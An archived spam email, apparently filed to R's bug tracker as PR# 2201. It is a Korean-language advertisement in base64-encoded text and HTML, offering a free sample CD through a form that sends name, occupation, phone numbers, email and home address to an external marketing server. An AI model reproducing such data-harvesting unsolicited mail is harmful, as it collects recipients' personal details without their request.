teXG+SAgOi4uLiAgIA0KIGUtuN7AzyAgOi4uLiAgIA0KIMHWvNIuLi4gIDogICAgICANCiAg
ICAgCQkJICAgDQogICAgICAgILHNx8/AxyAgvcK29L74wMwgyKu6uLy6IMD8wNq/7MbtwLsg
urizu7DUILXIwaEgwaTB38j3ILvnsPogteW4s7TPtNkuIMGkurjF673FuMEgwMy/6w0KIMPL
wfi5/SCx1MGkwLsgwdi89sfPv6kgsaSw7bjewM/A08C7IMelvcPHz7+0wLi45ywgvPa9xbDF
us7A5cShuKYguLa3w8fPsO3A1r3AtM+02S4NCiC89r3FwLsgIL/4xKEgvsrAuL3DuOkgvPa9
xbDFus4oUmVqZWN0ICBNYWlsKbimIMWsuK/H2CDB1r3KvcO/5A0KICAgICAgICANCg==

------=_NextPart_000_0037_01C0F19A.93A26C00
Content-Type: text/html;
	charset="ks_c_5601-1987"
Content-Transfer-Encoding: base64

PGh0bWw+DQo8aGVhZD4NCjx0aXRsZT5rbGM8L3RpdGxlPg0KPG1ldGEgaHR0cC1lcXVpdj0i
Q29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9ZXVjLWtyIj4NCjwv
aGVhZD4NCg0KPGJvZHkgYmdjb2xvcj0iI0ZGRkZGRiIgdGV4dD0iIzAwMDAwMCIgbGVmdG1h
cmdpbj0iMSIgdG9wbWFyZ2luPSIxIj4NCjx0YWJsZSB3aWR0aD0iNjAwIiBib3JkZXI9IjAi
IGNlbGxzcGFjaW5nPSIwIiBjZWxscGFkZGluZz0iMCI+DQogIDx0cj4NCiAgICA8dGQgYmdj
b2xvcj0iI0NDQ0NDQyI+DQogICAgICA8dGFibGUgd2lkdGg9IjYwMCIgYm9yZGVyPSIwIiBj
ZWxsc3BhY2luZz0iMSIgY2VsbHBhZGRpbmc9IjAiPg0KICAgICAgICA8dHI+IA0KICAgICAg
ICAgIDx0ZCBiZ2NvbG9yPSIjRkZGRkZGIj4gDQogICAgICAgICAgICA8dGFibGUgd2lkdGg9
IjYwMCIgYm9yZGVyPSIwIiBjZWxsc3BhY2luZz0iMCIgY2VsbHBhZGRpbmc9IjAiPg0KICAg
ICAgICAgICAgICA8dHI+IA0KICAgICAgICAgICAgICAgIDx0ZD48aW1nIHNyYz0iaHR0cDov
L3d3dy5tYWlscGFydG5lci5jby5rci9lbWFpbC8wNzI1L2ltZ18xLmdpZiIgd2lkdGg9IjYw
MCIgaGVpZ2h0PSIxMDQiPjwvdGQ+DQogICAgICAgICAgICAgIDwvdHI+DQogICAgICAgICAg
ICAgIDx0cj4gDQogICAgICAgICAgICAgICAgPHRkPjxpbWcgc3JjPSJodHRwOi8vd3d3Lm1h
aWxwYXJ0bmVyLmNvLmtyL2VtYWlsLzA3MjUvaW1nXzIuZ2lmIiB3aWR0aD0iNjAwIiBoZWln
aHQ9IjEwMCI+PC90ZD4NCiAgICAgICAgICAgICAgPC90cj4NCiAgICAgICAgICAgICAgPHRy
PiANCiAgICAgICAgICAgICAgICA8dGQ+PGltZyBzcmM9Imh0dHA6Ly93d3cubWFpbHBhcnRu
ZXIuY28ua3IvZW1haWwvMDcyNS9pbWdfMy5naWYiIHdpZHRoPSI2MDAiIGhlaWdodD0iMTE4
Ij48L3RkPg0KICAgICAgICAgICAgICA8L3RyPg0KICAgICAgICAgICAgICA8dHI+IA0KICAg
ICAgICAgICAgICAgIDx0ZD48aW1nIHNyYz0iaHR0cDovL3d3dy5tYWlscGFydG5lci5jby5r
ci9lbWFpbC8wNzI1L2ltZ180LmdpZiIgd2lkdGg9IjYwMCIgaGVpZ2h0PSIxMDMiPjwvdGQ+
DQogICAgICAgICAgICAgIDwvdHI+DQogICAgICAgICAgICAgIDx0cj4gDQogICAgICAgICAg
ICAgICAgPHRkPjxpbWcgc3JjPSJodHRwOi8vd3d3Lm1haWxwYXJ0bmVyLmNvLmtyL2VtYWls
LzA3MjUvaW1nXzUuZ2lmIiB3aWR0aD0iNjAwIiBoZWlnaHQ9IjExNSI+PC90ZD4NCiAgICAg
ICAgICAgICAgPC90cj4NCiAgICAgICAgICAgICAgPHRyPiANCiAgICAgICAgICAgICAgICA8
dGQ+PGltZyBzcmM9Imh0dHA6Ly93d3cubWFpbHBhcnRuZXIuY28ua3IvZW1haWwvMDcyNS9p
bWdfNi5naWYiIHdpZHRoPSI2MDAiIGhlaWdodD0iODAiPjwvdGQ+DQogICAgICAgICAgICAg
IDwvdHI+DQogICAgICAgICAgICAgIDx0cj4gDQogICAgICAgICAgICAgICAgPHRkPjxpbWcg
c3JjPSJodHRwOi8vd3d3Lm1haWxwYXJ0bmVyLmNvLmtyL2VtYWlsLzA3MjUvaW1nXzcuZ2lm
IiB3aWR0aD0iNjAwIiBoZWlnaHQ9Ijc2Ij48L3RkPg0KICAgICAgICAgICAgICA8L3RyPg0K
ICAgICAgICAgICAgICA8dHI+IA0KICAgICAgICAgICAgICAgIDx0ZD4gDQogICAgICAgICAg
ICAgICAgICA8dGFibGUgY2VsbHBhZGRpbmc9IjAiIGNlbGxzcGFjaW5nPSIwIiB3aWR0aD0i
NTA5IiBhbGlnbj0iY2VudGVyIj4NCiAgICAgICAgICAgICAgICAgICAgPHRyIGJhY2tncm91
bmQ9ImJvZC0yLmpwZyI+IA0KICAgICAgICAgICAgICAgICAgICAgIDx0ZCBiYWNrZ3JvdW5k
PSJodHRwOi8vd3d3Lm1haWxwYXJ0bmVyLmNvLmtyL2VtYWlsLzA3MjUvYm9kLTIuanBnIiBo
ZWlnaHQ9IjMwMiI+IA0KICAgICAgICAgICAgICAgICAgICAgICAgPHA+Jm5ic3A7PC9wPg0K
ICAgICAgICAgICAgICAgICAgICAgICAgPHAgYWxpZ249ImNlbnRlciI+PGZvbnQgc2l6ZT0i
MiI+PGJyPg0KICAgICAgICAgICAgICAgICAgICAgICAgICA8YnI+DQogICAgICAgICAgICAg
ICAgICAgICAgICAgIDxicj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgPGJyPg0KICAg
ICAgICAgICAgICAgICAgICAgICAgICC7+cfDQ0QgvcXDu8DatMIgwda80siuwM6w+iDH1LKy
ILmrt+G3ziC7+cfDQ0S4piC53sC7ILz2IMDWwLi45yA8YnI+DQogICAgICAgICAgICAgICAg
ICAgICAgICAgIMDPwdbAz7CjIMfQvcDDvMfowMcgseLIuLimILXluLO0z7TZLjxicj4NCiAg
ICAgICAgICAgICAgICAgICAgICAgICAgPC9mb250PjwvcD4NCiAgICAgICAgICAgICAgICAg
ICAgICAgIDx0YWJsZSB3aWR0aD0iNDUwIiBib3JkZXI9IjAiIGNlbGxzcGFjaW5nPSIwIiBj
ZWxscGFkZGluZz0iMCIgYWxpZ249ImNlbnRlciI+DQoJCQk8Zm9ybSBuYW1lPSJmb3JtMSIg
bWV0aG9kPSJwb3N0IiBhY3Rpb249Imh0dHA6Ly93d3cubWFpbHBhcnRuZXIuY28ua3IvZW1h
aWwvMDcyNS9rbHNfb2suYXNwIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgPHRyPiAN
CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8dGQgd2lkdGg9IjI4NSI+IA0KICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICA8cCBzdHlsZT0ibGluZS1oZWlnaHQ6MTQwJTsg
bWFyZ2luLXRvcDowOyBtYXJnaW4tYm90dG9tOjA7IG1hcmdpbi1sZWZ0OjMwOyI+PHNwYW4g
c3R5bGU9ImZvbnQtc2l6ZTo5cHQ7Ij7AzLinPGZvbnQgY29sb3I9IiNGRkZGRkYiPi4uLjwv
Zm9udD4gDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgOiAmbmJzcDsmbmJz
cDsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InRl
eHQiIG5hbWU9Im5hbWUiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwv
c3Bhbj48L3A+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxwIHN0eWxlPSJs
aW5lLWhlaWdodDoxNDAlOyBtYXJnaW4tdG9wOjA7IG1hcmdpbi1ib3R0b206MDsgbWFyZ2lu
LWxlZnQ6MzA7Ij48c3BhbiBzdHlsZT0iZm9udC1zaXplOjlwdDsiPsH3vvc8Zm9udCBjb2xv
cj0iI0ZGRkZGRiI+Li4uPC9mb250PiAgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAg
OiAmbmJzcDsmbmJzcDsNCgkJCQkJCQk8c2VsZWN0IG5hbWU9ImpvYiIgc2l6ZT0iMSIgPg0K
ICAgICAgICAgICAgICAgIAkJCTxvcHRpb24gdmFsdWU9IjEic2VsZWN0ZWQ+wffA5cDOPC9v
cHRpb24+DQogICAgICAgICAgICAgICAgCQkJPG9wdGlvbiB2YWx1ZT0iMiI+wNq/tb73PC9v
cHRpb24+DQogICAgICAgICAgICAgICAgCQkJPG9wdGlvbiB2YWx1ZT0iMyI+wda6zjwvb3B0
aW9uPg0KICAgICAgICAgICAgICAgIAkJCTxvcHRpb24gdmFsdWU9IjQiPrTrx9C7/Twvb3B0
aW9uPg0KICAgICAgICAgICAgICAgIAkJCTxvcHRpb24gdmFsdWU9IjUiPrDtte7H0Lv9PC9v
cHRpb24+DQogICAgICAgICAgICAgICAgCQkJPG9wdGlvbiB2YWx1ZT0iNiI+wd/H0Lv9PC9v
cHRpb24+DQogICAgICAgICAgICAgICAgCQkJPG9wdGlvbiB2YWx1ZT0iNyI+w8q17sfQu/08
L29wdGlvbj4NCgkJCQkJCQk8b3B0aW9uIHZhbHVlPSI4Ij6x4sW4PC9vcHRpb24+DQogICAg
ICAgICAgICAgIAkJCQk8L3NlbGVjdD4NCiAgICAgICAgICAgICAgCQkJCTwvc3Bhbj48L3A+
DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8cCBzdHlsZT0ibGluZS1oZWlnaHQ6
MTQwJTsgbWFyZ2luLXRvcDowOyBtYXJnaW4tYm90dG9tOjA7IG1hcmdpbi1sZWZ0OjMwOyI+
PHNwYW4gc3R5bGU9ImZvbnQtc2l6ZTo5cHQ7Ij7A/MitPGZvbnQgY29sb3I9IiNGRkZGRkYi
Pi4uLjwvZm9udD4gDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDogJm5ic3A7
Jm5ic3A7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0i
dGV4dCIgbmFtZT0idGVsMSI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwv
c3Bhbj48L3A+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8cCBzdHlsZT0ibGlu
ZS1oZWlnaHQ6MTQwJTsgbWFyZ2luLXRvcDowOyBtYXJnaW4tYm90dG9tOjA7IG1hcmdpbi1s
ZWZ0OjMwOyI+PHNwYW4gc3R5bGU9ImZvbnQtc2l6ZTo5cHQ7Ij7H2rXlxvkgDQogICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgIDo8Zm9udCBjb2xvcj0iI0ZGRkZGRiI+Li4uPC9m
b250PiANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InRl
eHQiIG5hbWU9InRlbDIiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L3Nw
YW4+PC9wPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHAgc3R5bGU9ImxpbmUt
aGVpZ2h0OjE0MCU7IG1hcmdpbi10b3A6MDsgbWFyZ2luLWJvdHRvbTowOyBtYXJnaW4tbGVm
dDozMDsiPjxzcGFuIHN0eWxlPSJmb250LXNpemU6OXB0OyI+ZS243sDPIA0KICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICA6PGZvbnQgY29sb3I9IiNGRkZGRkYiPi4uLjwvZm9u
dD4gDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0
IiBuYW1lPSJlbWFpbCI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvc3Bh
bj48L3A+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8cCBzdHlsZT0ibGluZS1o
ZWlnaHQ6MTQwJTsgbWFyZ2luLXRvcDowOyBtYXJnaW4tYm90dG9tOjA7IG1hcmdpbi1sZWZ0
OjMwOyI+PHNwYW4gc3R5bGU9ImZvbnQtc2l6ZTo5cHQ7Ij7B1rzSPGZvbnQgY29sb3I9IiNG
RkZGRkYiPi4uLjwvZm9udD4gDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDog
Jm5ic3A7Jm5ic3A7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQg
dHlwZT0idGV4dCIgbmFtZT0iYWRkcmVzcyI+DQogICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgIDwvc3Bhbj48L3A+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC90ZD4N
CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8dGQgd2lkdGg9IjE2NSI+IA0KICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImltYWdlIiBzcmM9Imh0dHA6
Ly93d3cubWFpbHBhcnRuZXIuY28ua3IvZW1haWwvMDcyNS9ib2RfMS5qcGciIGJvcmRlcj0i
MCIgbmFtZT0iaW1hZ2UiIHdpZHRoPSIxMDEiIGhlaWdodD0iNzYiPg0KICAgICAgICAgICAg
ICAgICAgICAgICAgICAgIDwvdGQ+DQogICAgICAgICAgICAgICAgICAgICAgICAgIDwvdHI+
DQoJCQk8L2Zvcm0+DQogICAgICAgICAgICAgICAgICAgICAgICA8L3RhYmxlPg0KICAgICAg
ICAgICAgICAgICAgICAgICAgPHAgYWxpZ249ImNlbnRlciI+Jm5ic3A7PC9wPg0KICAgICAg
ICAgICAgICAgICAgICAgIDwvdGQ+DQogICAgICAgICAgICAgICAgICAgIDwvdHI+DQogICAg
ICAgICAgICAgICAgICA8L3RhYmxlPg0KICAgICAgICAgICAgICAgIDwvdGQ+DQogICAgICAg
ICAgICAgIDwvdHI+DQogICAgICAgICAgICAgIDx0cj4gDQogICAgICAgICAgICAgICAgPHRk
PiANCiAgICAgICAgICAgICAgICAgIDxwIHN0eWxlPSJsaW5lLWhlaWdodDoxNDAlOyBtYXJn
aW4tdG9wOjA7IG1hcmdpbi1ib3R0b206MDsgbWFyZ2luLWxlZnQ6MTA7IiBhbGlnbj0iY2Vu
dGVyIj48Zm9udCBmYWNlPSKxvLiyIiBjb2xvcj0iIzY2NjY2NiI+PHNwYW4gc3R5bGU9ImZv
bnQtc2l6ZTo5cHQ7Ij48Zm9udCBzaXplPSIyIj6xzcfPwMcgDQogICAgICAgICAgICAgICAg
ICAgIL3CtvS++MDMIMiruri8uiDA/MDav+zG7cC7ILq4s7uw1CC1yMGhIMGkwd/I9yC757D6
ILXluLO0z7TZLiDBpLq4xeu9xbjBIMDMv+s8YnI+DQogICAgICAgICAgICAgICAgICAgIMPL
wfi5/SCx1MGkwLsgwdi89sfPv6kgsaSw7bjewM/A08C7IMelvcPHz7+0wLi45ywgvPa9xbDF
us7A5cShuKYguLa3w8fPsO3A1r3AtM+02S48YnI+DQogICAgICAgICAgICAgICAgICAgIDwv
Zm9udD48L3NwYW4+PC9mb250Pjxmb250IGZhY2U9IrG8uLIiIGNvbG9yPSIjNjY2NjY2IiBz
aXplPSIyIj48c3BhbiBzdHlsZT0iZm9udC1zaXplOjlwdDsiPrz2vcXAuyANCiAgICAgICAg
ICAgICAgICAgICAgv/jEoSC+ysC4vcO46SA8L3NwYW4+PC9mb250Pjxmb250IGNvbG9yPSIj
NjY2NjY2IiBzaXplPSIyIj48c3BhbiBzdHlsZT0iZm9udC1zaXplOjlwdDsiPjxhIGhyZWY9
Im1haWx0bzpoeXVuMTAzMTBAa29ybmV0Lm5ldCI+vPa9xbDFus4oUmVqZWN0IA0KICAgICAg
ICAgICAgICAgICAgICBNYWlsKTwvYT48Zm9udCBmYWNlPSKxvLiyIj64piDFrLivx9ggwda9
yr3Dv+Q8L2ZvbnQ+PC9zcGFuPjwvZm9udD48L3A+DQogICAgICAgICAgICAgICAgPC90ZD4N
CiAgICAgICAgICAgICAgPC90cj4NCiAgICAgICAgICAgIDwvdGFibGU+DQogICAgICAgICAg
PC90ZD4NCiAgICAgICAgPC90cj4NCiAgICAgIDwvdGFibGU+DQogICAgPC90ZD4NCiAgPC90
cj4NCjwvdGFibGU+DQo8YnI+DQo8L2JvZHk+DQo8L2h0bWw+DQo=

------=_NextPart_000_0037_01C0F19A.93A26C00--

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2201 *
Subject: =?ks_c_5601-1987?B?W7GksO1dIL7ux9Cxs8DnILy8sOggxse4xSAxwKcgxeXF9bnMv6G8rSC5q7fhu/nHwyBDRLimILq4s7u15biztM+02S4=?=
From: =?ks_c_5601-1987?B?xeXF9bnM?= <hyun10310@kornet.net>
Date: Wed, 23 Oct 2002 03:19:23 +0900
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2201 <==
From hyun10310@kornet.net  Tue Oct 22 20:21:46 2002
Received: from relay5.kornet.net (relay5.kornet.net [211.48.62.165])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id UAA12585
	for <r-bugs@biostat.ku.dk>; Tue, 22 Oct 2002 20:21:44 +0200 (MET DST)
Received: from your-afc98a0fg0 (61.73.152.25) by relay5.kornet.net; 23 Oct 2002 03:20:40 +0900
Message-ID: <3db596f93dbb9ead@relay5.kornet.net> (added by relay5.kornet.net)
From: =?ks_c_5601-1987?B?xeXF9bnM?= <hyun10310@kornet.net>
To: r-bugs@biostat.ku.dk
Subject: =?ks_c_5601-1987?B?W7GksO1dIL7ux9Cxs8DnILy8sOggxse4xSAxwKcgxeXF9bnMv6G8rSC5q7fhu/nHwyBDRLimILq4s7u15biztM+02S4=?=
Date: Wed, 23 Oct 2002 03:19:23 +0900
MIME-Version: 1.0
Content-Type: multipart/alternative;
	boundary="----=_NextPart_000_0037_01C0F19A.93A23C00"
X-Priority: 3
X-MSMail-Priority: Normal
X-Mailer: Microsoft Outlook Express 6.00.2600.0000
X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000

This is a multi-part message in MIME format.

------=_NextPart_000_0037_01C0F19A.93A23C00
Content-Type: text/plain;
	charset="ks_c_5601-1987"
Content-Transfer-Encoding: base64

a2xjICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogDQogDQogDQogDQogDQog
u/nHw0NEIL3Fw7vA2rTCIMHWvNLIrsDOsPogx9SysiC5q7fht84gu/nHw0NEuKYgud7AuyC8
9iDA1sC4uOcgDQogwM/B1sDPsKMgx9C9wMO8x+jAxyCx4si4uKYgteW4s7TPtNkuDQogDQog
CQkJICAgwMy4py4uLiAgOiAgICAgIA0KIMH3vvcuLi4gIDogICAJCQkJCQkJIAkJCcH3wOXA
ziAJCQnA2r+1vvcgCQkJwda6ziAJCQm068fQu/0gCQkJsO217sfQu/0gCQkJwd/H0Lv9IAkJ
CcPKte7H0Lv9CQkJCQkJCbHixbggCQkJCSAJCQkJDQogwPzIrS4uLiAgOiAgICAgIA0KIMfa
teXG+SAgOi4uLiAgIA0KIGUtuN7AzyAgOi4uLiAgIA0KIMHWvNIuLi4gIDogICAgICANCiAg
ICAgCQkJICAgDQogICAgICAgILHNx8/AxyAgvcK29L74wMwgyKu6uLy6IMD8wNq/7MbtwLsg
urizu7DUILXIwaEgwaTB38j3ILvnsPogteW4s7TPtNkuIMGkurjF673FuMEgwMy/6w0KIMPL
wfi5/SCx1MGkwLsgwdi89sfPv6kgsaSw7bjewM/A08C7IMelvcPHz7+0wLi45ywgvPa9xbDF
us7A5cShuKYguLa3w8fPsO3A1r3AtM+02S4NCiC89r3FwLsgIL/4xKEgvsrAuL3DuOkgvPa9
xbDFus4oUmVqZWN0ICBNYWlsKbimIMWsuK/H2CDB1r3KvcO/5A0KICAgICAgICANCg==

------=_NextPart_000_0037_01C0F19A.93A23C00
Content-Type: text/html;
	charset="ks_c_5601-1987"
Content-Transfer-Encoding: base64

PGh0bWw+DQo8aGVhZD4NCjx0aXRsZT5rbGM8L3RpdGxlPg0KPG1ldGEgaHR0cC1lcXVpdj0i
Q29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9ZXVjLWtyIj4NCjwv
aGVhZD4NCg0KPGJvZHkgYmdjb2xvcj0iI0ZGRkZGRiIgdGV4dD0iIzAwMDAwMCIgbGVmdG1h
cmdpbj0iMSIgdG9wbWFyZ2luPSIxIj4NCjx0YWJsZSB3aWR0aD0iNjAwIiBib3JkZXI9IjAi
IGNlbGxzcGFjaW5nPSIwIiBjZWxscGFkZGluZz0iMCI+DQogIDx0cj4NCiAgICA8dGQgYmdj
b2xvcj0iI0NDQ0NDQyI+DQogICAgICA8dGFibGUgd2lkdGg9IjYwMCIgYm9yZGVyPSIwIiBj
ZWxsc3BhY2luZz0iMSIgY2VsbHBhZGRpbmc9IjAiPg0KICAgICAgICA8dHI+IA0KICAgICAg
ICAgIDx0ZCBiZ2NvbG9yPSIjRkZGRkZGIj4gDQogICAgICAgICAgICA8dGFibGUgd2lkdGg9
IjYwMCIgYm9yZGVyPSIwIiBjZWxsc3BhY2luZz0iMCIgY2VsbHBhZGRpbmc9IjAiPg0KICAg
ICAgICAgICAgICA8dHI+IA0KICAgICAgICAgICAgICAgIDx0ZD48aW1nIHNyYz0iaHR0cDov
L3d3dy5tYWlscGFydG5lci5jby5rci9lbWFpbC8wNzI1L2ltZ18xLmdpZiIgd2lkdGg9IjYw
MCIgaGVpZ2h0PSIxMDQiPjwvdGQ+DQogICAgICAgICAgICAgIDwvdHI+DQogICAgICAgICAg
ICAgIDx0cj4gDQogICAgICAgICAgICAgICAgPHRkPjxpbWcgc3JjPSJodHRwOi8vd3d3Lm1h
aWxwYXJ0bmVyLmNvLmtyL2VtYWlsLzA3MjUvaW1nXzIuZ2lmIiB3aWR0aD0iNjAwIiBoZWln
aHQ9IjEwMCI+PC90ZD4NCiAgICAgICAgICAgICAgPC90cj4NCiAgICAgICAgICAgICAgPHRy
PiANCiAgICAgICAgICAgICAgICA8dGQ+PGltZyBzcmM9Imh0dHA6Ly93d3cubWFpbHBhcnRu
ZXIuY28ua3IvZW1haWwvMDcyNS9pbWdfMy5naWYiIHdpZHRoPSI2MDAiIGhlaWdodD0iMTE4
Ij48L3RkPg0KICAgICAgICAgICAgICA8L3RyPg0KICAgICAgICAgICAgICA8dHI+IA0KICAg
ICAgICAgICAgICAgIDx0ZD48aW1nIHNyYz0iaHR0cDovL3d3dy5tYWlscGFydG5lci5jby5r
ci9lbWFpbC8wNzI1L2ltZ180LmdpZiIgd2lkdGg9IjYwMCIgaGVpZ2h0PSIxMDMiPjwvdGQ+
DQogICAgICAgICAgICAgIDwvdHI+DQogICAgICAgICAgICAgIDx0cj4gDQogICAgICAgICAg
ICAgICAgPHRkPjxpbWcgc3JjPSJodHRwOi8vd3d3Lm1haWxwYXJ0bmVyLmNvLmtyL2VtYWls
LzA3MjUvaW1nXzUuZ2lmIiB3aWR0aD0iNjAwIiBoZWlnaHQ9IjExNSI+PC90ZD4NCiAgICAg
ICAgICAgICAgPC90cj4NCiAgICAgICAgICAgICAgPHRyPiANCiAgICAgICAgICAgICAgICA8
dGQ+PGltZyBzcmM9Imh0dHA6Ly93d3cubWFpbHBhcnRuZXIuY28ua3IvZW1haWwvMDcyNS9p
bWdfNi5naWYiIHdpZHRoPSI2MDAiIGhlaWdodD0iODAiPjwvdGQ+DQogICAgICAgICAgICAg
IDwvdHI+DQogICAgICAgICAgICAgIDx0cj4gDQogICAgICAgICAgICAgICAgPHRkPjxpbWcg
c3JjPSJodHRwOi8vd3d3Lm1haWxwYXJ0bmVyLmNvLmtyL2VtYWlsLzA3MjUvaW1nXzcuZ2lm
IiB3aWR0aD0iNjAwIiBoZWlnaHQ9Ijc2Ij48L3RkPg0KICAgICAgICAgICAgICA8L3RyPg0K
ICAgICAgICAgICAgICA8dHI+IA0KICAgICAgICAgICAgICAgIDx0ZD4gDQogICAgICAgICAg
ICAgICAgICA8dGFibGUgY2VsbHBhZGRpbmc9IjAiIGNlbGxzcGFjaW5nPSIwIiB3aWR0aD0i
NTA5IiBhbGlnbj0iY2VudGVyIj4NCiAgICAgICAgICAgICAgICAgICAgPHRyIGJhY2tncm91
bmQ9ImJvZC0yLmpwZyI+IA0KICAgICAgICAgICAgICAgICAgICAgIDx0ZCBiYWNrZ3JvdW5k
PSJodHRwOi8vd3d3Lm1haWxwYXJ0bmVyLmNvLmtyL2VtYWlsLzA3MjUvYm9kLTIuanBnIiBo
ZWlnaHQ9IjMwMiI+IA0KICAgICAgICAgICAgICAgICAgICAgICAgPHA+Jm5ic3A7PC9wPg0K
ICAgICAgICAgICAgICAgICAgICAgICAgPHAgYWxpZ249ImNlbnRlciI+PGZvbnQgc2l6ZT0i
MiI+PGJyPg0KICAgICAgICAgICAgICAgICAgICAgICAgICA8YnI+DQogICAgICAgICAgICAg
ICAgICAgICAgICAgIDxicj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgPGJyPg0KICAg
ICAgICAgICAgICAgICAgICAgICAgICC7+cfDQ0QgvcXDu8DatMIgwda80siuwM6w+iDH1LKy
ILmrt+G3ziC7+cfDQ0S4piC53sC7ILz2IMDWwLi45yA8YnI+DQogICAgICAgICAgICAgICAg
ICAgICAgICAgIMDPwdbAz7CjIMfQvcDDvMfowMcgseLIuLimILXluLO0z7TZLjxicj4NCiAg
ICAgICAgICAgICAgICAgICAgICAgICAgPC9mb250PjwvcD4NCiAgICAgICAgICAgICAgICAg
ICAgICAgIDx0YWJsZSB3aWR0aD0iNDUwIiBib3JkZXI9IjAiIGNlbGxzcGFjaW5nPSIwIiBj
ZWxscGFkZGluZz0iMCIgYWxpZ249ImNlbnRlciI+DQoJCQk8Zm9ybSBuYW1lPSJmb3JtMSIg
bWV0aG9kPSJwb3N0IiBhY3Rpb249Imh0dHA6Ly93d3cubWFpbHBhcnRuZXIuY28ua3IvZW1h
aWwvMDcyNS9rbHNfb2suYXNwIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgPHRyPiAN
CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8dGQgd2lkdGg9IjI4NSI+IA0KICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICA8cCBzdHlsZT0ibGluZS1oZWlnaHQ6MTQwJTsg
bWFyZ2luLXRvcDowOyBtYXJnaW4tYm90dG9tOjA7IG1hcmdpbi1sZWZ0OjMwOyI+PHNwYW4g
c3R5bGU9ImZvbnQtc2l6ZTo5cHQ7Ij7AzLinPGZvbnQgY29sb3I9IiNGRkZGRkYiPi4uLjwv
Zm9udD4gDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgOiAmbmJzcDsmbmJz
cDsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InRl
eHQiIG5hbWU9Im5hbWUiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwv
c3Bhbj48L3A+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxwIHN0eWxlPSJs
aW5lLWhlaWdodDoxNDAlOyBtYXJnaW4tdG9wOjA7IG1hcmdpbi1ib3R0b206MDsgbWFyZ2lu
LWxlZnQ6MzA7Ij48c3BhbiBzdHlsZT0iZm9udC1zaXplOjlwdDsiPsH3vvc8Zm9udCBjb2xv
cj0iI0ZGRkZGRiI+Li4uPC9mb250PiAgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAg
OiAmbmJzcDsmbmJzcDsNCgkJCQkJCQk8c2VsZWN0IG5hbWU9ImpvYiIgc2l6ZT0iMSIgPg0K
ICAgICAgICAgICAgICAgIAkJCTxvcHRpb24gdmFsdWU9IjEic2VsZWN0ZWQ+wffA5cDOPC9v
cHRpb24+DQogICAgICAgICAgICAgICAgCQkJPG9wdGlvbiB2YWx1ZT0iMiI+wNq/tb73PC9v
cHRpb24+DQogICAgICAgICAgICAgICAgCQkJPG9wdGlvbiB2YWx1ZT0iMyI+wda6zjwvb3B0
aW9uPg0KICAgICAgICAgICAgICAgIAkJCTxvcHRpb24gdmFsdWU9IjQiPrTrx9C7/Twvb3B0
aW9uPg0KICAgICAgICAgICAgICAgIAkJCTxvcHRpb24gdmFsdWU9IjUiPrDtte7H0Lv9PC9v
cHRpb24+DQogICAgICAgICAgICAgICAgCQkJPG9wdGlvbiB2YWx1ZT0iNiI+wd/H0Lv9PC9v
cHRpb24+DQogICAgICAgICAgICAgICAgCQkJPG9wdGlvbiB2YWx1ZT0iNyI+w8q17sfQu/08
L29wdGlvbj4NCgkJCQkJCQk8b3B0aW9uIHZhbHVlPSI4Ij6x4sW4PC9vcHRpb24+DQogICAg
ICAgICAgICAgIAkJCQk8L3NlbGVjdD4NCiAgICAgICAgICAgICAgCQkJCTwvc3Bhbj48L3A+
DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8cCBzdHlsZT0ibGluZS1oZWlnaHQ6
MTQwJTsgbWFyZ2luLXRvcDowOyBtYXJnaW4tYm90dG9tOjA7IG1hcmdpbi1sZWZ0OjMwOyI+
PHNwYW4gc3R5bGU9ImZvbnQtc2l6ZTo5cHQ7Ij7A/MitPGZvbnQgY29sb3I9IiNGRkZGRkYi
